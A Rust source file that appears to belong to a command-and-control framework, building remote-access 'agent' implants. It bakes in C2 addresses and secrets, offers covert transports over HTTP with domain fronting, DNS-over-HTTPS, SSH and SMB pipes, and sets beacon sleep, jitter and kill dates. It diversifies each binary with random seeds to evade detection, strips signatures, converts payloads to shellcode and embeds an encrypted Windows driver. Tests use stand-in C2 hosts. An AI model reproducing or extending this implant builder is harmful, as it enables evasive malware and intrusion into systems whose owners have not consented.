//! Payload build pipeline: cargo build → strip → artifact kit → encrypt → write to `dist/`.

use anyhow::{anyhow, Context, Result};
use std::path::{Path, PathBuf};
use std::process::Command;
use tracing::{info, warn};

use crate::config::{
    partition_features, read_agent_features, PayloadConfig, PayloadFormat, PayloadTransport,
};
use crate::mobile::{MobileConfig, MobilePlatform};
use crate::pe_artifact_kit;

/// Build the agent for a mobile platform (Android/iOS) and return the
/// resulting artifact bytes along with build metadata.
#[allow(dead_code)]
pub fn build_mobile_agent(mobile_cfg: &MobileConfig) -> Result<Vec<u8>> {
    mobile_cfg
        .validate()
        .map_err(|e| anyhow!("Mobile config validation failed: {e}"))?;

    let triples = mobile_cfg.target_triples();
    if triples.is_empty() {
        anyhow::bail!("No valid target triples for mobile build");
    }

    // For now, build for the first target triple.  Multi-arch builds
    // (e.g., Android arm64 + x86_64) require lipo / multi-APK support
    // that will be added when the full NDK/Xcode pipeline is in place.
    let triple = triples[0];
    let output_name = mobile_cfg.output_filename();

    info!(
        platform = ?mobile_cfg.platform,
        triple,
        package_type = ?mobile_cfg.package_type,
        output = output_name,
        "Building mobile agent payload"
    );

    // Build the agent with mobile-postexp + appropriate target features.
    let features = vec!["mobile-postexp".to_string()];
    if mobile_cfg.platform == MobilePlatform::Android {
        // Android needs jni + android_logger support
        // TODO: Add android-specific features when target_os = "android"
    }

    let extra_env: Vec<(String, String)> = Vec::new();
    let bin_path = cargo_build("agent", "agent-standalone", triple, &features, &extra_env)?;

    if let Err(e) = strip_if_available(&bin_path, triple) {
        warn!("strip step skipped for mobile build: {e:#}");
    }

    // Post-processing: for .so outputs, copy directly. For APK/IPA,
    // the packaging step happens in the Java/Swift build systems.
    let binary = std::fs::read(&bin_path)
        .with_context(|| format!("Failed to read mobile binary {}", bin_path.display()))?;

    Ok(binary)
}

/// Build the agent for the given profile and return the raw binary bytes.
///
/// When `override_seed` is `Some(value)`, both `OPTIMIZER_STUB_SEED` and
/// `CODE_TRANSFORM_SEED` are set to that value so the build is fully
/// reproducible.  When `None`, fresh random seeds are generated for each
/// build, producing unique binaries every time.
pub fn build_agent_for_profile(cfg: &PayloadConfig, override_seed: Option<u64>) -> Result<Vec<u8>> {
    let triple = cfg.target_triple()?;
    let package = cfg.package.as_str();
    let bin_name = cfg.bin_name.as_deref().unwrap_or(package);

    let effective_features = features_for_package(package, &cfg.features)?;
    validate_transport_feature(cfg.transport, &effective_features)?;
    validate_embedded_driver_config(cfg, &effective_features)?;
    cfg.validate_transport_settings()?;

    let mut extra_env = build_time_env(cfg, &effective_features);

    // ── Per-build seed diversification ──────────────────────────────────────
    //
    // Every build gets unique OPTIMIZER_STUB_SEED and CODE_TRANSFORM_SEED
    // values, so the resulting binary differs from every other build even when
    // the source code and profile are identical.  When `override_seed` is
    // supplied the same value is used for both seeds, making the build
    // bit-for-bit reproducible.
    let seed = override_seed.unwrap_or_else(generate_random_seed);
    let seed_hex = format!("{:016x}", seed);
    info!(seed = %seed_hex, "Build diversification seed");
    extra_env.push(("OPTIMIZER_STUB_SEED".into(), seed_hex.clone()));
    extra_env.push(("CODE_TRANSFORM_SEED".into(), seed_hex));

    info!(target_triple = %triple, package, bin = %bin_name, "Building agent payload");
    let bin_path = cargo_build(package, bin_name, &triple, &effective_features, &extra_env)?;

    if let Err(e) = strip_if_available(&bin_path, &triple) {
        warn!("strip step skipped: {e:#}");
    }

    let mut binary = std::fs::read(&bin_path)
        .with_context(|| format!("Failed to read built binary {}", bin_path.display()))?;

    // Apply PE artifact kit post-processing (no-op for non-PE / non-Windows targets).
    pe_artifact_kit::apply_all(&mut binary, cfg)
        .context("PE artifact kit post-processing failed")?;

    package_output_format(binary, cfg, seed)
}

pub(crate) fn build_time_env(
    cfg: &PayloadConfig,
    effective_features: &[String],
) -> Vec<(String, String)> {
    let mut extra_env: Vec<(String, String)> = Vec::new();
    if effective_features.iter().any(|f| f == "outbound-c") {
        extra_env.push(("ORCHESTRA_C_ADDR".into(), cfg.c2_address.clone()));
        extra_env.push((
            "ORCHESTRA_TRANSPORT".into(),
            cfg.transport.as_str().to_string(),
        ));
        if let Some(ref fp) = cfg.server_cert_fingerprint {
            extra_env.push(("ORCHESTRA_C_CERT_FP".into(), fp.clone()));
        }
        if let Some(ref secret) = cfg.c_server_secret {
            extra_env.push(("ORCHESTRA_C_SECRET".into(), secret.clone()));
        } else {
            warn!(
                "outbound-c feature enabled but c_server_secret is not set in the profile. \
                 The agent will require the ORCHESTRA_SECRET env var at runtime."
            );
        }

        match cfg.transport {
            PayloadTransport::Tls => {}
            PayloadTransport::Http => {
                extra_env.push(("ORCHESTRA_HTTP_ENDPOINT".into(), cfg.http_endpoint()));
                if let Some(host_header) = cfg.http_host_header() {
                    extra_env.push(("ORCHESTRA_HTTP_HOST_HEADER".into(), host_header));
                }
            }
            PayloadTransport::Doh => {
                extra_env.push(("ORCHESTRA_DOH_SERVER_URL".into(), cfg.doh_server_url()));
                if let Some(domain) = cfg.doh_domain() {
                    extra_env.push(("ORCHESTRA_DOH_DOMAIN".into(), domain));
                }
            }
            PayloadTransport::Ssh => {
                if let Some(host) = cfg.ssh_host() {
                    extra_env.push(("ORCHESTRA_SSH_HOST".into(), host));
                }
                let ssh_port = cfg
                    .transport_settings
                    .ssh_port
                    .or_else(|| cfg.transport_port())
                    .unwrap_or(22);
                extra_env.push(("ORCHESTRA_SSH_PORT".into(), ssh_port.to_string()));
                if let Some(username) = cfg
                    .transport_settings
                    .ssh_username
                    .as_deref()
                    .map(str::trim)
                    .filter(|username| !username.is_empty())
                {
                    extra_env.push(("ORCHESTRA_SSH_USERNAME".into(), username.to_string()));
                }
                if let Some(auth) = cfg.transport_settings.ssh_auth.as_ref() {
                    extra_env.push((
                        "ORCHESTRA_SSH_AUTH_JSON".into(),
                        serde_json::to_string(auth).expect("SshAuthConfig serializes to JSON"),
                    ));
                }
                if let Some(fingerprint) = cfg
                    .transport_settings
                    .ssh_host_key_fingerprint
                    .as_deref()
                    .map(str::trim)
                    .filter(|fingerprint| !fingerprint.is_empty())
                {
                    extra_env.push(("ORCHESTRA_SSH_HOST_KEY_FP".into(), fingerprint.to_string()));
                }
            }
            PayloadTransport::Smb => {
                if let Some(host) = cfg.smb_pipe_host() {
                    extra_env.push(("ORCHESTRA_SMB_PIPE_HOST".into(), host));
                }
                if let Some(pipe_name) = cfg
                    .transport_settings
                    .smb_pipe_name
                    .as_deref()
                    .map(str::trim)
                    .filter(|pipe_name| !pipe_name.is_empty())
                {
                    extra_env.push(("ORCHESTRA_SMB_PIPE_NAME".into(), pipe_name.to_string()));
                }
                if let Some(mode) = cfg
                    .transport_settings
                    .smb_pipe_mode
                    .as_deref()
                    .map(str::trim)
                    .filter(|mode| !mode.is_empty())
                {
                    extra_env.push(("ORCHESTRA_SMB_PIPE_MODE".into(), mode.to_string()));
                }
                if let Some(port) = cfg.transport_settings.smb_tcp_relay_port {
                    extra_env.push(("ORCHESTRA_SMB_TCP_RELAY_PORT".into(), port.to_string()));
                }
            }
        }
    }

    // Bake in the module AES key when provided (allows server-side builds to
    // produce self-contained agents without requiring an agent.toml).
    if let Some(ref module_key) = cfg.module_aes_key {
        if !module_key.trim().is_empty() {
            extra_env.push(("ORCHESTRA_MODULE_AES_KEY".into(), module_key.clone()));
        }
    }

    // Bake in the module verify key when provided so the agent verifies
    // signed modules against the server's signing key instead of falling back
    // to the compile-time MODULE_SIGNING_PUBKEY constant.
    if let Some(ref verify_key) = cfg.module_verify_key {
        if !verify_key.trim().is_empty() {
            extra_env.push(("ORCHESTRA_MODULE_VERIFY_KEY".into(), verify_key.clone()));
        }
    }

    if let Some(sleep_ms) = cfg.sleep_ms {
        extra_env.push(("ORCHESTRA_SLEEP_MS".into(), sleep_ms.to_string()));
    }
    if let Some(jitter) = cfg.jitter {
        extra_env.push(("ORCHESTRA_JITTER".into(), jitter.to_string()));
    }
    if let Some(ref kill_date) = cfg.kill_date {
        if !kill_date.trim().is_empty() {
            extra_env.push(("ORCHESTRA_KILL_DATE".into(), kill_date.trim().to_string()));
        }
    }

    // Bake in the embedded driver path when provided.
    // The agent build.rs forwards ORCHESTRA_DRIVER_PATH → SYS_DRIVER_PATH and
    // sets the `has_sys_driver_path` cfg flag so `deploy.rs` can include the
    // driver bytes at compile time.
    if embedded_driver_enabled(effective_features) {
        if let Some(ref driver_path) = cfg.driver_path {
            let trimmed = driver_path.trim();
            if !trimmed.is_empty() {
                extra_env.push((
                    "ORCHESTRA_DRIVER_PATH".into(),
                    resolved_driver_path_for_env(trimmed),
                ));
            }
        }
    }

    extra_env
}

fn validate_transport_feature(
    transport: PayloadTransport,
    effective_features: &[String],
) -> Result<()> {
    let required = match transport {
        PayloadTransport::Tls => return Ok(()),
        PayloadTransport::Http => "http-transport",
        PayloadTransport::Doh => "doh-transport",
        PayloadTransport::Ssh => "ssh-transport",
        PayloadTransport::Smb => "smb-pipe-transport",
    };
    if effective_features.iter().any(|feature| feature == required) {
        Ok(())
    } else {
        Err(anyhow!(
            "{} transport requires the '{}' agent feature",
            transport.as_str(),
            required
        ))
    }
}

fn embedded_driver_enabled(effective_features: &[String]) -> bool {
    effective_features.iter().any(|f| f == "embedded_driver")
}

fn resolved_driver_path_for_env(path: &str) -> String {
    std::fs::canonicalize(path)
        .unwrap_or_else(|_| PathBuf::from(path))
        .to_string_lossy()
        .into_owned()
}

fn placeholder_driver_bytes() -> Option<Vec<u8>> {
    let builder_dir = Path::new(env!("CARGO_MANIFEST_DIR"));
    let workspace_root = builder_dir.parent().unwrap_or(builder_dir);
    std::fs::read(
        workspace_root
            .join("agent")
            .join("resources")
            .join("placeholder_driver.xor"),
    )
    .ok()
}

fn validate_embedded_driver_config(
    cfg: &PayloadConfig,
    effective_features: &[String],
) -> Result<()> {
    if !embedded_driver_enabled(effective_features) {
        return Ok(());
    }

    if !cfg.target_os.eq_ignore_ascii_case("windows") {
        anyhow::bail!("embedded_driver is only supported for Windows builds");
    }

    let driver_path = cfg
        .driver_path
        .as_deref()
        .map(str::trim)
        .filter(|p| !p.is_empty())
        .ok_or_else(|| {
            anyhow!("embedded_driver requires driver_path (path to XOR-encrypted driver binary)")
        })?;

    let driver_bytes = std::fs::read(driver_path).with_context(|| {
        format!(
            "embedded_driver driver_path is not readable: {}",
            driver_path
        )
    })?;
    if driver_bytes.is_empty() {
        anyhow::bail!("embedded_driver driver_path is empty: {driver_path}");
    }

    if let Some(placeholder_bytes) = placeholder_driver_bytes() {
        if driver_bytes == placeholder_bytes {
            anyhow::bail!(
                "embedded_driver driver_path points to the placeholder payload: {driver_path}"
            );
        }
    }

    Ok(())
}

fn package_output_format(binary: Vec<u8>, cfg: &PayloadConfig, seed: u64) -> Result<Vec<u8>> {
    match cfg.output_format {
        PayloadFormat::Exe => Ok(binary),
        PayloadFormat::Shellcode => {
            if cfg.target_os != "windows" || cfg.target_arch != "x86_64" {
                anyhow::bail!("shellcode output is supported only for windows/x86_64 PE payloads");
            }
            shellcode_packager::package(&binary, seed)
                .context("failed to convert Windows PE payload to shellcode")
        }
    }
}

fn features_for_package(package: &str, requested: &[String]) -> Result<Vec<String>> {
    match package {
        "agent" => {
            let available = read_agent_features().unwrap_or_default();
            let (effective_features, unknown_features) = if available.is_empty() {
                (requested.to_vec(), Vec::new())
            } else {
                partition_features(requested, &available)
            };
            if !unknown_features.is_empty() {
                anyhow::bail!(
                    "profile references feature(s) not declared in agent/Cargo.toml: {}",
                    unknown_features.join(", ")
                );
            }
            Ok(effective_features)
        }
        "launcher" => {
            // The launcher binary is a *downloader stub* that the operator
            // deploys directly to the endpoint (via MDM, rsync, etc.).  It
            // fetches and runs the encrypted agent payload at runtime, so it
            // must not itself be encrypted and served as a downloadable payload
            // (that would require another launcher to download it — circular).
            //
            // If you are trying to build the agent payload to be served on the
            // payload-server, use:
            //   package = "agent"
            //   (no outbound-c: agent waits for inbound server connection)
            //   (outbound-c: agent dials the Control Center automatically)
            //
            // The launcher binary is built with `cargo build -p launcher` and
            // deployed out-of-band; it does not go through the profile/encrypt
            // pipeline.
            anyhow::bail!(
                "package `launcher` cannot be used as a downloadable payload target.\n\
                 The launcher binary is a downloader stub that is deployed directly to \
                 the endpoint — encrypting it as a payload would require another launcher \
                 to download it, creating a circular dependency.\n\
                 \n\
                 To build the agent payload served by the dev-server, set:\n\
                 \n  package = \"agent\"\n\
                 \n\
                 Then build the launcher stub separately with:\n\
                 \n  cargo build --release -p launcher --target <triple>"
            )
        }
        other => anyhow::bail!(
            "unsupported payload package `{other}`; supported packages are `agent` and `launcher`"
        ),
    }
}

/// Run `cargo build --release` for the specified package and target.
fn cargo_build(
    package: &str,
    bin: &str,
    triple: &str,
    features: &[String],
    extra_env: &[(String, String)],
) -> Result<PathBuf> {
    let mut args = vec![
        "build".to_string(),
        "--release".to_string(),
        "--package".to_string(),
        package.to_string(),
        "--bin".to_string(),
        bin.to_string(),
        "--target".to_string(),
        triple.to_string(),
    ];
    if !features.is_empty() {
        args.push("--features".to_string());
        args.push(features.join(","));
    }

    let mut cmd = Command::new("cargo");
    cmd.args(&args).envs(extra_env.iter().cloned());

    info!("Running: {:?}", cmd);
    let status = cmd
        .status()
        .with_context(|| format!("Failed to execute cargo build for {package}"))?;

    if !status.success() {
        return Err(anyhow!("cargo build for {package} failed"));
    }

    // The final binary is in `target/<triple>/release/<bin_name>[.exe]`.
    let artifact_name = if triple.contains("windows") {
        format!("{bin}.exe")
    } else {
        bin.to_string()
    };
    let path = Path::new("target")
        .join(triple)
        .join("release")
        .join(artifact_name);
    if !path.exists() {
        anyhow::bail!("expected built binary at {}", path.display());
    }
    Ok(path)
}

/// Run a target-compatible `strip` on the binary if the tool is available.
fn strip_if_available(path: &Path, triple: &str) -> Result<()> {
    let host = host_triple();
    let is_cross_target = host.as_deref() != Some(triple);
    let strip = if triple.contains("windows") {
        which::which(format!("{triple}-strip"))
            .or_else(|_| which::which("x86_64-w64-mingw32-strip"))
            .map_err(|_| anyhow!("no Windows-compatible strip tool on PATH"))?
    } else if is_cross_target {
        which::which(format!("{triple}-strip"))
            .map_err(|_| anyhow!("no target-compatible {triple}-strip tool on PATH"))?
    } else {
        which::which("strip").map_err(|e| anyhow!("`strip` not on PATH: {e}"))?
    };
    info!("Stripping binary with {}", strip.display());
    let status = Command::new(strip)
        .arg(path)
        .status()
        .context("Failed to run `strip`")?;
    if !status.success() {
        warn!("strip command failed");
    }
    Ok(())
}

fn host_triple() -> Option<String> {
    let output = Command::new("rustc").arg("-vV").output().ok()?;
    if !output.status.success() {
        return None;
    }
    let stdout = String::from_utf8_lossy(&output.stdout);
    stdout
        .lines()
        .find_map(|line| line.strip_prefix("host: ").map(str::to_owned))
}

/// Generate a random `u64` seed.
///
/// Primary path: `rand::RngCore` (available on all platforms).
/// Secondary path (Unix only): read 8 bytes from `/dev/urandom`.
/// Last resort: mix time and PID (predictable — only used when both
/// primary and secondary paths fail).
fn generate_random_seed() -> u64 {
    // Primary: use the rand crate (available on all platforms).
    // rand::thread_rng().next_u64() draws from the OS CSPRNG and does not
    // panic in practice, so we call it directly without catch_unwind.
    use rand::RngCore;
    let mut rng = rand::thread_rng();
    rng.next_u64()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn test_driver_path(name: &str) -> PathBuf {
        let unique = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .unwrap()
            .as_nanos();
        std::env::temp_dir().join(format!(
            "orchestra-builder-{name}-{}-{unique}.xor",
            std::process::id()
        ))
    }

    fn embedded_driver_cfg(driver_path: Option<String>) -> PayloadConfig {
        PayloadConfig {
            target_os: "windows".to_string(),
            target_arch: "x86_64".to_string(),
            c2_address: "127.0.0.1:8444".to_string(),
            encryption_key: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=".to_string(),
            c_server_secret: Some("secret".to_string()),
            server_cert_fingerprint: Some("0".repeat(64)),
            features: vec!["embedded_driver".to_string()],
            transport: PayloadTransport::Tls,
            transport_settings: crate::config::TransportSettings::default(),
            output_name: None,
            package: "agent".to_string(),
            bin_name: Some("agent-standalone".to_string()),
            output_format: PayloadFormat::Exe,
            sleep_ms: None,
            jitter: None,
            kill_date: None,
            version_info: None,
            icon_path: None,
            manifest_preset: None,
            custom_manifest: None,
            strip_signature: true,
            strip_debug: true,
            module_aes_key: None,
            module_verify_key: None,
            driver_path,
        }
    }

    #[test]
    fn launcher_rejects_agent_features() {
        let requested = vec!["persistence".to_string()];
        let err = features_for_package("launcher", &requested).unwrap_err();
        assert!(err.to_string().contains("launcher"));
    }

    #[test]
    fn unsupported_package_is_rejected() {
        let err = features_for_package("not-a-package", &[]).unwrap_err();
        assert!(err.to_string().contains("unsupported payload package"));
    }

    #[test]
    fn embedded_driver_requires_driver_path() {
        let cfg = embedded_driver_cfg(None);
        let err =
            validate_embedded_driver_config(&cfg, &["embedded_driver".to_string()]).unwrap_err();
        assert!(err.to_string().contains("requires driver_path"));
    }

    #[test]
    fn embedded_driver_rejects_placeholder_payload() {
        let cfg = embedded_driver_cfg(Some("agent/resources/placeholder_driver.xor".to_string()));
        let err =
            validate_embedded_driver_config(&cfg, &["embedded_driver".to_string()]).unwrap_err();
        assert!(err.to_string().contains("placeholder"));
    }

    #[test]
    fn embedded_driver_accepts_readable_non_placeholder_payload() {
        let path = test_driver_path("payload");
        std::fs::write(&path, [0x41, 0x42, 0x43, 0x44]).unwrap();
        let cfg = embedded_driver_cfg(Some(path.to_string_lossy().into_owned()));

        validate_embedded_driver_config(&cfg, &["embedded_driver".to_string()]).unwrap();
        let env = build_time_env(&cfg, &["embedded_driver".to_string()]);
        assert!(env.contains(&(
            "ORCHESTRA_DRIVER_PATH".to_string(),
            std::fs::canonicalize(&path)
                .unwrap()
                .to_string_lossy()
                .into_owned()
        )));

        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn build_env_includes_baked_behavior_settings() {
        let cfg = PayloadConfig {
            target_os: "linux".to_string(),
            target_arch: "x86_64".to_string(),
            c2_address: "127.0.0.1:8444".to_string(),
            encryption_key: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=".to_string(),
            c_server_secret: Some("secret".to_string()),
            server_cert_fingerprint: Some("0".repeat(64)),
            features: vec!["outbound-c".to_string()],
            transport: PayloadTransport::Tls,
            transport_settings: crate::config::TransportSettings::default(),
            output_name: None,
            package: "agent".to_string(),
            bin_name: Some("agent-standalone".to_string()),
            output_format: PayloadFormat::Exe,
            sleep_ms: Some(12_345),
            jitter: Some(37),
            kill_date: Some("2099-12-31".to_string()),
            version_info: None,
            icon_path: None,
            manifest_preset: None,
            custom_manifest: None,
            strip_signature: true,
            strip_debug: true,
            module_aes_key: None,
            module_verify_key: None,
            driver_path: None,
        };

        let env = build_time_env(&cfg, &["outbound-c".to_string()]);

        assert!(env.contains(&("ORCHESTRA_SLEEP_MS".to_string(), "12345".to_string())));
        assert!(env.contains(&("ORCHESTRA_JITTER".to_string(), "37".to_string())));
        assert!(env.contains(&("ORCHESTRA_KILL_DATE".to_string(), "2099-12-31".to_string())));
    }

    #[test]
    fn build_env_includes_baked_transport_settings() {
        let cfg = PayloadConfig {
            target_os: "linux".to_string(),
            target_arch: "x86_64".to_string(),
            c2_address: "c2.example.com:8446".to_string(),
            encryption_key: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=".to_string(),
            c_server_secret: Some("secret".to_string()),
            server_cert_fingerprint: Some("0".repeat(64)),
            features: vec!["outbound-c".to_string(), "http-transport".to_string()],
            transport: PayloadTransport::Http,
            transport_settings: crate::config::TransportSettings {
                http_endpoint: Some("https://front.example.com/c2".to_string()),
                http_host_header: Some("c2.example.com".to_string()),
                ..crate::config::TransportSettings::default()
            },
            output_name: None,
            package: "agent".to_string(),
            bin_name: Some("agent-standalone".to_string()),
            output_format: PayloadFormat::Exe,
            sleep_ms: None,
            jitter: None,
            kill_date: None,
            version_info: None,
            icon_path: None,
            manifest_preset: None,
            custom_manifest: None,
            strip_signature: true,
            strip_debug: true,
            module_aes_key: None,
            module_verify_key: None,
            driver_path: None,
        };

        let env = build_time_env(&cfg, &["outbound-c".to_string()]);

        assert!(env.contains(&("ORCHESTRA_TRANSPORT".to_string(), "http".to_string())));
        assert!(env.contains(&(
            "ORCHESTRA_HTTP_ENDPOINT".to_string(),
            "https://front.example.com/c2".to_string()
        )));
        assert!(env.contains(&(
            "ORCHESTRA_HTTP_HOST_HEADER".to_string(),
            "c2.example.com".to_string()
        )));
    }

    #[test]
    fn ssh_transport_requires_auth_settings() {
        let cfg = PayloadConfig {
            target_os: "linux".to_string(),
            target_arch: "x86_64".to_string(),
            c2_address: "ssh.example.com:22".to_string(),
            encryption_key: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=".to_string(),
            c_server_secret: Some("secret".to_string()),
            server_cert_fingerprint: Some("0".repeat(64)),
            features: vec!["outbound-c".to_string(), "ssh-transport".to_string()],
            transport: PayloadTransport::Ssh,
            transport_settings: crate::config::TransportSettings::default(),
            output_name: None,
            package: "agent".to_string(),
            bin_name: Some("agent-standalone".to_string()),
            output_format: PayloadFormat::Exe,
            sleep_ms: None,
            jitter: None,
            kill_date: None,
            version_info: None,
            icon_path: None,
            manifest_preset: None,
            custom_manifest: None,
            strip_signature: true,
            strip_debug: true,
            module_aes_key: None,
            module_verify_key: None,
            driver_path: None,
        };

        let err = cfg.validate_transport_settings().unwrap_err();
        assert!(err.to_string().contains("ssh_username"));
    }
}
